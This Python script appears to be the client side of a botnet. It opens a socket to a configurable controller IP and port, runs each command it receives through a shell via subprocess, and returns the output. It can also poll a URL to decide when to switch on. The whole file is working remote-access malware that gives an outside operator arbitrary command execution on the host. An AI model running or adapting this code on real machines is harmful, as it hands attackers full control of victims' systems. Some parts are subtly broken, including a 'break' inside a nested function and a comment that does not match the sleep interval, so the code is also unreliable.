#! /usr/bin/env python3

from os import error
import modules, urllib.request, time, socket, subprocess
import modules.socketnoise as socketnoise


botname = ''			# Put name of bot here
host = '192.168.0.16'		# Put controller IP here
port = 2828				# Put controller listening port here
connections = {
	'source':'',		# Put URL for update here. Leave blank for manual only.
	'instruction':'manual'	# Put url for currently active device here. if source is set to 'manual', the bot will automatially start.
}

if connections['instruction'] == 'manual':
	ACTIVE = 'manual'
else:
	ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname ) # finds if instruction matches current bot

# connection ============================================= #
def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print( "[CCCli] Attempting to connect to {} on port {} ...".format(host, port) )
	s.connect((host, port))
	print( "[CCCli] Controller accepted connection." )

	while True: 
		def handlecommand(command):
			if command == '==terminate':
				try:
					print( "[CCCli] Controller terminated connection." )
					s.close()
				except ConnectionResetError as e:
					pass
				break
			else:
				try:
					CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					return str(CMD.stdout.read().decode('utf-8')) + str(CMD.stderr.read().decode('utf-8'))
				except error as e:
					return f'[ERROR] {e}'

		socketnoise.answer(s, handlecommand)

	return
# ======================================================== #

while True: # Tests for instruction every 10 seconds.
	time.sleep(5)
	if ACTIVE == False:
		if connections['instruction'] != 'manual':
			ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname )
		continue
	elif ( ACTIVE == True ) or ( ACTIVE == 'manual' ):
		try:
			connect()
		except ConnectionError as e:
			pass